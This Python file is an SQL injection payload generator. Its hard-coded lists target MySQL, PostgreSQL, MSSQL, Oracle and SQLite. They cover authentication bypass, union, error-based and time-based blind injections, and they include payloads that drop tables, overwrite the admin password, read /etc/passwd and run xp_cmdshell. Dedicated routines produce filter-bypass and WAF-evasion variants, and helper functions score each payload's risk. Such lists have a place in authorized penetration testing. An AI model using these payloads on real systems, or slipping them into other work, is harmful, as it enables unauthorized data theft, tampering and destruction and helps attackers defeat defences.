"""
SQL injection payload generator module
Generates SQL injection payloads with database-specific techniques and WAF evasion
"""

import json
import random
import re
from typing import List, Dict, Any


class SQLiGenerator:
    """Generates SQL injection payloads with advanced evasion techniques"""
    
    def __init__(self):
        """Initialize SQLi generator with payload database"""
        self.payload_database = []
        self._initialize_default_payloads()
    
    def _initialize_default_payloads(self):
        """Initialize with default SQL injection payloads"""
        self.payload_database = [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'a'='a",
            
            # Union-based payloads
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT null,null,null--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT 1,version(),3--",
            "' UNION SELECT 1,user(),3--",
            "' UNION SELECT 1,database(),3--",
            
            # Error-based payloads
            "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),floor(rand(0)*2)))--",
            "' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
            "' AND updatexml(1,concat(0x7e,version(),0x7e),1)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
            "' AND (SELECT LENGTH(database()))>0--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            
            # Time-based blind
            "' AND (SELECT SLEEP(5))--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT 1 FROM PG_SLEEP(5))--",
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)=1--",
            
            # Second-order payloads
            "test'; INSERT INTO users VALUES ('admin','password')--",
            "test'; UPDATE users SET password='pwned' WHERE username='admin'--",
            "test'; DROP TABLE users--",
            
            # NoSQL injection
            "' || 'a'=='a",
            "' || '1'=='1",
            "'; return true;--",
            "'; return 1==1;--"
        ]
    
    def load_payload_database(self, file_path: str):
        """Load payloads from JSON file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, list):
                    self.payload_database.extend(data)
                elif isinstance(data, dict) and 'sqli_payloads' in data:
                    self.payload_database.extend(data['sqli_payloads'])
        except Exception as e:
            print(f"Warning: Could not load SQLi payload database: {e}")
    
    def generate_payloads(self, count: int = 5, database: str = 'mysql',
                         filter_bypass: bool = False, waf_evasion: bool = False,
                         blind: bool = False) -> List[str]:
        """
        Generate SQL injection payloads based on database type and requirements
        
        Args:
            count: Number of payloads to generate
            database: Database type (mysql, postgres, mssql, oracle, sqlite)
            filter_bypass: Include filter bypass techniques
            waf_evasion: Include WAF evasion techniques
            blind: Generate blind injection payloads
            
        Returns:
            List of SQL injection payloads
        """
        payloads = []
        
        # Database-specific payload generation
        if database.lower() == 'mysql':
            payloads.extend(self._generate_mysql_payloads(count))
        elif database.lower() == 'postgres':
            payloads.extend(self._generate_postgres_payloads(count))
        elif database.lower() == 'mssql':
            payloads.extend(self._generate_mssql_payloads(count))
        elif database.lower() == 'oracle':
            payloads.extend(self._generate_oracle_payloads(count))
        elif database.lower() == 'sqlite':
            payloads.extend(self._generate_sqlite_payloads(count))
        else:
            # Default to generic payloads
            payloads.extend(random.sample(self.payload_database, 
                                        min(count, len(self.payload_database))))
        
        # Add blind injection payloads if requested
        if blind:
            payloads.extend(self._generate_blind_payloads(count // 2, database))
        
        # Apply filter bypass techniques
        if filter_bypass:
            payloads.extend(self._generate_filter_bypass_payloads(count // 2))
        
        # Apply WAF evasion techniques
        if waf_evasion:
            payloads.extend(self._generate_waf_evasion_payloads(count // 2))
        
        # Remove duplicates and limit count
        unique_payloads = list(set(payloads))
        return unique_payloads[:count]
    
    def _generate_mysql_payloads(self, count: int) -> List[str]:
        """Generate MySQL-specific payloads"""
        mysql_payloads = [
            # Basic MySQL
            "' OR '1'='1'#",
            "' UNION SELECT 1,version(),3#",
            "' UNION SELECT 1,user(),database()#",
            "' UNION SELECT 1,@@version,3#",
            "' UNION SELECT 1,@@datadir,3#",
            
            # MySQL functions
            "' AND extractvalue(1,concat(0x7e,version(),0x7e))#",
            "' AND updatexml(1,concat(0x7e,version(),0x7e),1)#",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#",
            
            # MySQL time-based
            "' AND (SELECT SLEEP(5))#",
            "' AND IF(1=1,SLEEP(5),0)#",
            "' AND (SELECT BENCHMARK(10000000,MD5('test')))#",
            
            # Information schema
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables#",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns#",
            "' UNION SELECT 1,table_schema,3 FROM information_schema.tables#",
            
            # MySQL-specific
            "' INTO OUTFILE '/tmp/test.txt'#",
            "' UNION SELECT 1,load_file('/etc/passwd'),3#"
        ]
        
        return random.sample(mysql_payloads, min(count, len(mysql_payloads)))
    
    def _generate_postgres_payloads(self, count: int) -> List[str]:
        """Generate PostgreSQL-specific payloads"""
        postgres_payloads = [
            # Basic PostgreSQL
            "' OR '1'='1'--",
            "' UNION SELECT 1,version(),3--",
            "' UNION SELECT 1,current_user,current_database()--",
            "' UNION SELECT 1,user,3--",
            
            # PostgreSQL functions
            "' AND (SELECT 1 FROM PG_SLEEP(5))--",
            "' AND (SELECT COUNT(*) FROM pg_stat_activity WHERE usename=current_user)>0--",
            "' UNION SELECT 1,current_setting('data_directory'),3--",
            
            # Information schema
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns--",
            
            # PostgreSQL-specific
            "' UNION SELECT 1,pg_read_file('/etc/passwd'),3--",
            "' UNION SELECT 1,version(),3 FROM pg_user--",
            "' AND (SELECT 1 FROM generate_series(1,1000000))--",
            
            # Error-based
            "' AND CAST(version() AS int)--",
            "' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--"
        ]
        
        return random.sample(postgres_payloads, min(count, len(postgres_payloads)))
    
    def _generate_mssql_payloads(self, count: int) -> List[str]:
        """Generate MS SQL Server-specific payloads"""
        mssql_payloads = [
            # Basic MSSQL
            "' OR '1'='1'--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,system_user,db_name()--",
            "' UNION SELECT 1,user_name(),3--",
            
            # Time-based
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)--",
            
            # Error-based
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
            
            # System tables
            "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT 1,name,3 FROM syscolumns--",
            "' UNION SELECT 1,loginname,3 FROM sysprocesses--",
            
            # MSSQL-specific
            "'; EXEC xp_cmdshell('whoami')--",
            "' UNION SELECT 1,@@servername,3--",
            "' UNION SELECT 1,db_name(),3--",
            
            # Stacked queries
            "'; INSERT INTO users VALUES ('admin','password')--",
            "'; CREATE TABLE temp (data varchar(50))--"
        ]
        
        return random.sample(mssql_payloads, min(count, len(mssql_payloads)))
    
    def _generate_oracle_payloads(self, count: int) -> List[str]:
        """Generate Oracle-specific payloads"""
        oracle_payloads = [
            # Basic Oracle
            "' OR '1'='1'--",
            "' UNION SELECT 1,banner,3 FROM v$version--",
            "' UNION SELECT 1,user,3 FROM dual--",
            
            # Time-based
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)=1--",
            "' AND (SELECT COUNT(*) FROM ALL_USERS)>0--",
            
            # Error-based
            "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NOT NULL--",
            "' AND CTXSYS.DRITHSX.SN(user,(CHR(39)||user||CHR(39)))=1--",
            
            # System tables
            "' UNION SELECT 1,table_name,3 FROM all_tables--",
            "' UNION SELECT 1,column_name,3 FROM all_tab_columns--",
            "' UNION SELECT 1,username,3 FROM all_users--",
            
            # Oracle-specific
            "' UNION SELECT 1,version,3 FROM v$instance--",
            "' UNION SELECT 1,name,3 FROM v$database--",
            "' FROM dual UNION SELECT 1,user,3--"
        ]
        
        return random.sample(oracle_payloads, min(count, len(oracle_payloads)))
    
    def _generate_sqlite_payloads(self, count: int) -> List[str]:
        """Generate SQLite-specific payloads"""
        sqlite_payloads = [
            # Basic SQLite
            "' OR '1'='1'--",
            "' UNION SELECT 1,sqlite_version(),3--",
            "' UNION SELECT 1,name,3 FROM sqlite_master--",
            
            # SQLite system tables
            "' UNION SELECT 1,sql,3 FROM sqlite_master--",
            "' UNION SELECT 1,tbl_name,3 FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT 1,name,3 FROM pragma_table_info('users')--",
            
            # SQLite functions
            "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
            "' UNION SELECT 1,hex(randomblob(10)),3--",
            "' AND SUBSTR(sqlite_version(),1,1)='3'--",
            
            # File operations (if enabled)
            "' UNION SELECT 1,load_extension('test'),3--",
            "' AND (SELECT writefile('/tmp/test.txt','test'))--"
        ]
        
        return random.sample(sqlite_payloads, min(count, len(sqlite_payloads)))
    
    def _generate_blind_payloads(self, count: int, database: str) -> List[str]:
        """Generate blind SQL injection payloads"""
        blind_payloads = []
        
        # Boolean-based blind
        boolean_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
            "' AND (SELECT LENGTH(database()))>5--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>10--",
            "' AND ASCII(SUBSTRING((SELECT version()),1,1))>50--",
            "' AND (SELECT user())='root'--"
        ]
        
        # Time-based blind (database-specific)
        if database.lower() == 'mysql':
            time_payloads = [
                "' AND (SELECT SLEEP(5))--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND (SELECT BENCHMARK(10000000,MD5('test')))--"
            ]
        elif database.lower() == 'postgres':
            time_payloads = [
                "' AND (SELECT 1 FROM PG_SLEEP(5))--",
                "' AND (SELECT 1 FROM generate_series(1,1000000))--"
            ]
        elif database.lower() == 'mssql':
            time_payloads = [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2)--"
            ]
        elif database.lower() == 'oracle':
            time_payloads = [
                "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)=1--",
                "' AND (SELECT COUNT(*) FROM ALL_USERS)>0--"
            ]
        else:
            time_payloads = [
                "' AND (SELECT SLEEP(5))--",
                "'; WAITFOR DELAY '00:00:05'--"
            ]
        
        blind_payloads.extend(boolean_payloads)
        blind_payloads.extend(time_payloads)
        
        return random.sample(blind_payloads, min(count, len(blind_payloads)))
    
    def _generate_filter_bypass_payloads(self, count: int) -> List[str]:
        """Generate payloads with filter bypass techniques"""
        bypass_payloads = [
            # Case variation
            "' Or '1'='1'--",
            "' oR 1=1--",
            "' UnIoN SeLeCt 1,2,3--",
            
            # Comment insertion
            "' OR/**/1=1--",
            "' UN/**/ION SE/**/LECT 1,2,3--",
            "' AND/**/(SELECT/**/1)--",
            
            # Whitespace variations
            "'\tOR\t1=1--",
            "'\nUNION\nSELECT\n1,2,3--",
            "'\rAND\r1=1--",
            
            # Alternative syntax
            "' OR 1 LIKE 1--",
            "' OR 1 RLIKE 1--",
            "' OR 1 REGEXP 1--",
            
            # Parentheses variations
            "' OR (1)=(1)--",
            "' OR ((1))=((1))--",
            "' AND (SELECT (1))--",
            
            # String concatenation
            "' OR 'a'||'b'='ab'--",
            "' OR 'a'+'b'='ab'--",
            "' OR CONCAT('a','b')='ab'--",
            
            # Encoding tricks
            "' OR CHAR(49)=CHAR(49)--",
            "' OR 0x31=0x31--",
            "' OR HEX('1')=HEX('1')--"
        ]
        
        return random.sample(bypass_payloads, min(count, len(bypass_payloads)))
    
    def _generate_waf_evasion_payloads(self, count: int) -> List[str]:
        """Generate payloads with WAF evasion techniques"""
        waf_evasion_payloads = [
            # Double encoding
            "%2527%20OR%20%25271%2527%253D%25271",
            
            # Alternative operators
            "' OR 1 LIKE 1--",
            "' OR 1 RLIKE 1--",
            "' OR 1 REGEXP 1--",
            "' OR 1 SOUNDS LIKE 1--",
            
            # Function obfuscation
            "' OR ASCII(SUBSTRING(version(),1,1))>49--",
            "' OR ORD(MID(version(),1,1))>49--",
            "' OR CONV(HEX(SUBSTRING(version(),1,1)),16,10)>49--",
            
            # Alternative syntax
            "' OR EXISTS(SELECT * FROM users)--",
            "' OR 1 IN (SELECT 1)--",
            "' OR (SELECT 1)=1--",
            
            # Bypass keyword filters
            "' OR 1=1 PROCEDURE ANALYSE()--",
            "' OR 1=1 GROUP BY CONCAT_WS(0x3a,version(),user())--",
            "' OR 1=1 ORDER BY 1--",
            
            # Alternative comments
            "' OR 1=1/*! --*/",
            "' OR 1=1/*!50000 --*/",
            "' OR 1=1#",
            "' OR 1=1;%00",
            
            # Unicode evasion
            "' ＯＲ '1'='1'--",
            "' %u006Fr 1=1--",
            
            # Nested queries
            "' OR (SELECT 1 FROM (SELECT 1)x)=1--",
            "' OR 1=(SELECT 1 FROM (SELECT 1)x)--"
        ]
        
        return random.sample(waf_evasion_payloads, min(count, len(waf_evasion_payloads)))
    
    def validate_payload(self, payload: str) -> Dict[str, Any]:
        """
        Validate SQL injection payload for basic syntax and structure
        
        Args:
            payload: SQL injection payload to validate
            
        Returns:
            Validation result dictionary
        """
        result = {
            'valid': True,
            'errors': [],
            'warnings': [],
            'score': 0
        }
        
        # Basic validation checks
        if not payload.strip():
            result['valid'] = False
            result['errors'].append("Empty payload")
            return result
        
        # Check for basic SQL injection patterns
        sqli_patterns = [
            r"'\s*(OR|AND)\s+",
            r"'\s*UNION\s+",
            r"'\s*SELECT\s+",
            r"--",
            r"#",
            r"/\*.*?\*/",
            r";\s*WAITFOR\s+",
            r"SLEEP\s*\(",
            r"BENCHMARK\s*\(",
            r"PG_SLEEP\s*\("
        ]
        
        pattern_matches = 0
        for pattern in sqli_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                pattern_matches += 1
        
        # Score based on pattern matches
        result['score'] = min(pattern_matches * 15, 100)
        
        # Check for common issues
        if "'" not in payload and '"' not in payload:
            result['warnings'].append("No quotes detected - may not be effective")
        
        # Check for SQL keywords
        sql_keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'WHERE', 'FROM']
        if not any(keyword in payload.upper() for keyword in sql_keywords):
            result['warnings'].append("No SQL keywords detected")
        
        # Check for dangerous operations
        dangerous_ops = ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'EXEC', 'xp_cmdshell']
        if any(op in payload.upper() for op in dangerous_ops):
            result['warnings'].append("Contains potentially destructive operations")
        
        return result
    
    def get_payload_info(self, payload: str) -> Dict[str, Any]:
        """
        Get detailed information about a SQL injection payload
        
        Args:
            payload: SQL injection payload to analyze
            
        Returns:
            Dictionary with payload information
        """
        info = {
            'type': 'SQLi',
            'length': len(payload),
            'injection_type': self._detect_injection_type(payload),
            'database_hints': self._detect_database_hints(payload),
            'techniques': self._detect_sqli_techniques(payload),
            'risk_level': self._assess_sqli_risk_level(payload)
        }
        
        return info
    
    def _detect_injection_type(self, payload: str) -> str:
        """Detect the type of SQL injection"""
        payload_upper = payload.upper()
        
        if 'UNION' in payload_upper and 'SELECT' in payload_upper:
            return 'union_based'
        elif any(keyword in payload_upper for keyword in ['SLEEP', 'WAITFOR', 'BENCHMARK', 'PG_SLEEP']):
            return 'time_based'
        elif any(keyword in payload_upper for keyword in ['EXTRACTVALUE', 'UPDATEXML', 'CONVERT']):
            return 'error_based'
        elif " OR " in payload_upper or " AND " in payload_upper:
            return 'boolean_based'
        else:
            return 'unknown'
    
    def _detect_database_hints(self, payload: str) -> List[str]:
        """Detect database-specific hints in the payload"""
        hints = []
        payload_upper = payload.upper()
        
        if any(keyword in payload_upper for keyword in ['@@VERSION', 'BENCHMARK', 'SLEEP']):
            hints.append('mysql')
        
        if any(keyword in payload_upper for keyword in ['PG_SLEEP', 'GENERATE_SERIES', 'CURRENT_SETTING']):
            hints.append('postgresql')
        
        if any(keyword in payload_upper for keyword in ['WAITFOR', 'XP_CMDSHELL', 'SYSUSERS']):
            hints.append('mssql')
        
        if any(keyword in payload_upper for keyword in ['DBMS_PIPE', 'CHR(', 'V$VERSION']):
            hints.append('oracle')
        
        if any(keyword in payload_upper for keyword in ['SQLITE_VERSION', 'SQLITE_MASTER']):
            hints.append('sqlite')
        
        return hints
    
    def _detect_sqli_techniques(self, payload: str) -> List[str]:
        """Detect techniques used in the SQL injection payload"""
        techniques = []
        payload_upper = payload.upper()
        
        if re.search(r'/\*.*?\*/', payload):
            techniques.append('comment_insertion')
        
        if re.search(r'[A-Z][a-z][A-Z]', payload):
            techniques.append('case_variation')
        
        if re.search(r'\s+', payload) and len(re.findall(r'\s+', payload)) > 2:
            techniques.append('whitespace_variation')
        
        if any(func in payload_upper for func in ['CHAR(', 'ASCII(', 'HEX(', 'CONV(']):
            techniques.append('encoding')
        
        if '||' in payload or '+' in payload or 'CONCAT' in payload_upper:
            techniques.append('concatenation')
        
        if re.search(r'\(\s*SELECT.*\)', payload_upper):
            techniques.append('subquery')
        
        return techniques
    
    def _assess_sqli_risk_level(self, payload: str) -> str:
        """Assess the risk level of the SQL injection payload"""
        risk_indicators = 0
        payload_upper = payload.upper()
        
        # Check for destructive operations
        destructive_ops = ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'TRUNCATE']
        for op in destructive_ops:
            if op in payload_upper:
                risk_indicators += 3
        
        # Check for system commands
        if any(keyword in payload_upper for keyword in ['XP_CMDSHELL', 'LOAD_FILE', 'INTO OUTFILE']):
            risk_indicators += 4
        
        # Check for information disclosure
        if any(keyword in payload_upper for keyword in ['VERSION', 'USER', 'DATABASE', 'SCHEMA']):
            risk_indicators += 2
        
        # Check for authentication bypass
        if any(pattern in payload_upper for pattern in ["OR '1'='1", "OR 1=1"]):
            risk_indicators += 2
        
        if risk_indicators >= 6:
            return 'critical'
        elif risk_indicators >= 4:
            return 'high'
        elif risk_indicators >= 2:
            return 'medium'
        else:
            return 'low'
